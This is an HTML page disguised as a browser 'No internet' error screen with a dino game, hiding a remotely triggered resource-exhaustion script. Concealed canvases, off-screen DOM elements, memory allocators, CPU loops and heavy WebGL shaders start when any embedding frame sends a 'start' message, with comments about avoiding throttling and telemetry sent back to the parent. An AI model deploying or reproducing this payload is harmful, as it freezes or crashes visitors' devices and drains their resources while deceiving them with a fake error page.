<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>No Internet</title>
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🦖</text></svg>">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
      background: #fff; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; color: #535353;
    }
    .container { text-align: center; max-width: 600px; }
    .icon { width:72px; height:72px; margin:0 auto 20px; opacity:0.5; }
    h1 { font-size:24px; font-weight: normal; margin-bottom:10px; color:#333; }
    p { font-size:14px; color:#777; line-height:1.6; }
    .dino-game { margin-top: 40px; position: relative; height: 150px; }
    #gameCanvas { border:none; display:block; margin:0 auto; }
    .hidden-canvas { position: absolute; left:0; top:0; width:1px; height:1px; opacity:0.01; }
    .reload-button { margin-top: 30px; padding: 10px 24px; background: #4285f4; color: white; border: none; border-radius: 4px; font-size: 14px; cursor: pointer; font-family: inherit; }
    .reload-button:hover { background:#3367d6; }
  </style>
</head>
<body>
  <div class="container">
    <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <circle cx="12" cy="12" r="10"></circle>
      <line x1="12" y1="8" x2="12" y2="12"></line>
      <line x1="12" y1="16" x2="12.01" y2="16"></line>
    </svg>
    <h1>No internet</h1>
    <p>Try:</p>
    <p>• Checking the network cables, modem, and router</p>
    <p>• Reconnecting to Wi‑Fi</p>
    <div class="dino-game"><canvas id="gameCanvas" width="600" height="150"></canvas></div>
    <button class="reload-button" onclick="location.reload()">Reload</button>
  </div>

  <!-- Hidden canvases for background rendering (kept tiny but present to avoid throttling) -->
  <canvas class="hidden-canvas" id="h1"></canvas>
  <canvas class="hidden-canvas" id="h2"></canvas>
  <canvas class="hidden-canvas" id="h3"></canvas>
  <canvas class="hidden-canvas" id="h4"></canvas>
  <canvas class="hidden-canvas" id="h5"></canvas>

  <script>
    // Visible lightweight dino scene (keeps page "alive")
    const canvas = document.getElementById('gameCanvas');
    const ctx = canvas.getContext('2d');
    let dino = { x: 50, y: 100, width: 40, height: 44, jumping: false, velocity: 0 };
    let obstacles = []; let gameSpeed = 5; let gameRunning = true;
    function drawDino(){ ctx.fillStyle = '#535353'; ctx.fillRect(dino.x, dino.y, dino.width, dino.height); }
    function drawObstacles(){ ctx.fillStyle = '#535353'; obstacles.forEach(obs => { ctx.fillRect(obs.x, obs.y, obs.width, obs.height); }); }
    function drawGround(){ ctx.strokeStyle = '#535353'; ctx.lineWidth = 2; ctx.beginPath(); ctx.moveTo(0,145); ctx.lineTo(600,145); ctx.stroke(); }
    function updateGame(){ if(!gameRunning) return; ctx.clearRect(0,0,canvas.width,canvas.height); if(dino.jumping){ dino.velocity+=0.8; dino.y+=dino.velocity; if(dino.y>=100){ dino.y=100; dino.jumping=false; dino.velocity=0; } } obstacles.forEach(obs=>{ obs.x-=gameSpeed; }); obstacles = obstacles.filter(obs=>obs.x>-obs.width); if(Math.random()<0.01){ obstacles.push({x:600,y:120,width:20,height:24}); } drawGround(); drawDino(); drawObstacles(); requestAnimationFrame(updateGame); }
    drawGround(); drawDino(); requestAnimationFrame(updateGame);

    // ================================
    // Stress backend (controlled via postMessage)
    // ================================
    let running = false;
    let rafIds = new Set();
    let timerIds = new Set();
    let telemetryTimer = null;
    let totalSpawned = 0;
    const TARGET = 100000000000; // 100B
    const batchSize = 67000000;   // 67M per batch

    // Hidden 2D canvases (keep small but with large internal resolution to push fill)
    const hiddenCanvases = [h1,h2,h3,h4,h5];
    hiddenCanvases.forEach(c=>{ c.width=2048; c.height=2048; });
    const hiddenContexts = hiddenCanvases.map(c => c.getContext('2d', { alpha:false }));

    let objects = [[],[],[],[],[]];
    let memoryArrays = [];
    let hiddenDomElements = [];

    function allocateMemory(){
      for(let i=0;i<5000;i++){
        memoryArrays.push(new Array(2000).fill(
          Math.random().toString(36)+Math.random().toString(36)+new Array(100).fill(Math.random())
        ));
      }
    }

    class SilentParticle{
      constructor(){
        this.x = Math.random()*2048; this.y = Math.random()*2048;
        this.vx=(Math.random()-0.5)*10; this.vy=(Math.random()-0.5)*10;
        this.size=Math.random()*40+10; this.rotation=Math.random()*Math.PI*2; this.rotSpeed=(Math.random()-0.5)*0.3;
        this.type=(Math.random()*8)|0; this.sides=((Math.random()*12)|0)+3;
      }
      update(){ this.x+=this.vx; this.y+=this.vy; this.rotation+=this.rotSpeed; if(this.x<-100||this.x>2148) this.vx*=-1; if(this.y<-100||this.y>2148) this.vy*=-1; }
      draw(ctx){ ctx.save(); ctx.translate(this.x,this.y); ctx.rotate(this.rotation); ctx.shadowBlur=20; ctx.shadowColor='#000'; ctx.fillStyle='#000'; ctx.strokeStyle='#000'; ctx.lineWidth=2; ctx.beginPath();
        switch(this.type){
          case 0: for(let i=0;i<this.sides*2;i++){ const ang=(i/(this.sides*2))*6.28318; const rad=i%2===0?this.size:this.size/2; const x=Math.cos(ang)*rad; const y=Math.sin(ang)*rad; if(i===0) ctx.moveTo(x,y); else ctx.lineTo(x,y);} ctx.closePath(); break;
          case 1: for(let i=0;i<100;i++){ const ang=(i/20)*6.28318; const rad=(i/100)*this.size; const x=Math.cos(ang)*rad; const y=Math.sin(ang)*rad; if(i===0) ctx.moveTo(x,y); else ctx.lineTo(x,y);} break;
          case 2: ctx.arc(0,0,this.size,0,6.28318); break;
          case 3: for(let i=0;i<this.sides;i++){ const ang=(i/this.sides)*6.28318; const x=Math.cos(ang)*this.size; const y=Math.sin(ang)*this.size; if(i===0) ctx.moveTo(x,y); else ctx.lineTo(x,y);} ctx.closePath(); break;
          case 4: for(let i=0;i<15;i++){ const ang=(i/15)*6.28318; ctx.moveTo(0,0); ctx.lineTo(Math.cos(ang)*this.size, Math.sin(ang)*this.size);} break;
          case 5: for(let i=0;i<this.sides;i++){ const s=this.size*(i/this.sides); ctx.rect(-s/2,-s/2,s,s);} break;
          case 6: for(let i=0;i<50;i++){ const ang=(i/50)*12.56636; const rad=this.size*Math.sin(i/5); const x=Math.cos(ang)*rad; const y=Math.sin(ang)*rad; if(i===0) ctx.moveTo(x,y); else ctx.lineTo(x,y);} break;
          case 7: for(let i=0;i<20;i++){ ctx.moveTo(Math.random()*this.size-this.size/2,Math.random()*this.size-this.size/2); ctx.lineTo(Math.random()*this.size-this.size/2,Math.random()*this.size-this.size/2);} break;
        }
        ctx.stroke(); ctx.fill(); ctx.restore(); }
    }

    function createHiddenDOM(){
      const el=document.createElement('div');
      el.style.position='absolute'; el.style.left='-9999px'; el.style.top='-9999px'; el.style.width='1000px'; el.style.height='1000px';
      el.style.background='linear-gradient(45deg,#000,#fff,#000)'; el.style.transform='rotate(0deg) scale(1)'; el.style.filter='blur(10px)';
      el.innerHTML='<div>'+ 'A'.repeat(10000) +'</div>';
      document.body.appendChild(el); hiddenDomElements.push(el);
      let rot=0; (function anim(){ if(!hiddenDomElements.includes(el)) return; rot+=5; el.style.transform=`rotate(${rot}deg) scale(${Math.sin(rot/10)+2})`; const id=requestAnimationFrame(anim); rafIds.add(id); })();
    }

    function silentBatch(){ if(!running) return; for(let i=0;i<batchSize;i++){ const layer=(Math.random()*5)|0; objects[layer].push(new SilentParticle()); totalSpawned++; if((i&0x1fff)===0) createHiddenDOM(); if((i&0x3fff)===0) allocateMemory(); }
      if(running && totalSpawned < TARGET){ const id = setTimeout(silentBatch, 0); timerIds.add(id); } else if (running) { startSilentRendering(); } }

    function startSilentRendering(){
      function render(){ if(!running) return; hiddenContexts.forEach((c2d,layer)=>{ c2d.fillStyle='#fff'; c2d.fillRect(0,0,c2d.canvas.width,c2d.canvas.height); const step=Math.max(1, Math.floor(objects[layer].length/50000)); for(let i=0;i<objects[layer].length;i+=step){ const o=objects[layer][i]; o.update(); o.draw(c2d); } }); const id=requestAnimationFrame(render); rafIds.add(id); }
      const id=requestAnimationFrame(render); rafIds.add(id);
    }

    // WebGL2 heavy shader flood
    let glCanvases=[];
    function startWebGLStress(instances=3){
      try{
        const VS = `#version 300 es\nvoid main(){ const vec2 p[3]=vec2[3](vec2(-1,-1),vec2(3,-1),vec2(-1,3)); gl_Position=vec4(p[gl_VertexID],0,1); }`;
        const FS = `#version 300 es\nprecision highp float; out vec4 o; uniform float t; uniform vec2 r; float h(vec2 p){ float s=0.0; float a=0.5; mat2 m=mat2(1.6,1.2,-1.2,1.6); for(int i=0;i<8;i++){ s+=a*abs(sin(p.x)*cos(p.y)); p=m*p+vec2(1.7,2.3); a*=0.65; } return s; } void main(){ vec2 uv=(gl_FragCoord.xy*2.0-r)/min(r.x,r.y); float v=0.0; for(int i=0;i<80;i++){ uv=uv.yx*mat2(0,1,-1,0)+vec2(0.003*t,0.007*t); v+=h(uv*float(i+1)); } v=fract(v*0.03125); o=vec4(vec3(v),1.0); }`;
        for(let i=0;i<instances;i++){
          const c=document.createElement('canvas'); c.width=2048; c.height=2048; c.style.width='160px'; c.style.height='90px'; document.body.appendChild(c); glCanvases.push(c);
          const gl=c.getContext('webgl2',{antialias:false,preserveDrawingBuffer:false,powerPreference:'high-performance'}); if(!gl) continue;
          function compile(src,type){ const s=gl.createShader(type); gl.shaderSource(s,src); gl.compileShader(s); return s; }
          const vs=compile(VS,gl.VERTEX_SHADER), fs=compile(FS,gl.FRAGMENT_SHADER); const prog=gl.createProgram(); gl.attachShader(prog,vs); gl.attachShader(prog,fs); gl.linkProgram(prog);
          const uT=gl.getUniformLocation(prog,'t'); const uR=gl.getUniformLocation(prog,'r'); gl.useProgram(prog); gl.viewport(0,0,c.width,c.height);
          function loop(ts){ if(!running) return; gl.useProgram(prog); gl.uniform1f(uT, ts*0.001); gl.uniform2f(uR, c.width, c.height); for(let k=0;k<8;k++){ gl.drawArrays(gl.TRIANGLES,0,3); } const id=requestAnimationFrame(loop); rafIds.add(id); }
          const id=requestAnimationFrame(loop); rafIds.add(id);
        }
      }catch(e){ console.warn('WebGL stress error', e); }
    }

    function startBackgroundCPU(){ const id=setInterval(()=>{ for(let i=0;i<200000;i++){ Math.sqrt((Math.random()*999999)); Math.sin(Math.random()*6.28318); Math.cos(Math.random()*6.28318); } }, 60); timerIds.add(id); }
    function startAllocators(){ for(let i=0;i<128;i++){ const id=setInterval(()=>allocateMemory(), 250 + i*5); timerIds.add(id); } }

    function startTelemetry(){ if(telemetryTimer) return; telemetryTimer=setInterval(()=>{ try{ parent.postMessage({type:'telemetry', spawned: totalSpawned, status: running?'running':'idle'}, '*'); } catch{} }, 500); }
    function stopTelemetry(){ if(telemetryTimer){ clearInterval(telemetryTimer); telemetryTimer=null; } }

    function startStress(){ if(running) return; running=true; try{ parent.postMessage({type:'telemetry', status:'starting'}, '*'); }catch{} startWebGLStress(3); startBackgroundCPU(); startAllocators(); silentBatch(); startSilentRendering(); startTelemetry(); }
    function stopStress(){ running=false; rafIds.forEach(id=>cancelAnimationFrame(id)); rafIds.clear(); timerIds.forEach(id=>clearInterval(id)); timerIds.clear(); stopTelemetry(); glCanvases.forEach(c=>c.remove()); glCanvases=[]; hiddenDomElements.forEach(el=>el.remove()); hiddenDomElements=[]; objects=[[],[],[],[],[]]; memoryArrays=[]; totalSpawned=0; try{ parent.postMessage({type:'telemetry', spawned: totalSpawned, status:'idle'}, '*'); }catch{} }

    // Control channel
    window.addEventListener('message', (e)=>{ const m=e.data||{}; if(m.type==='start') startStress(); if(m.type==='stop') stopStress(); });
  </script>
</body>
</html>
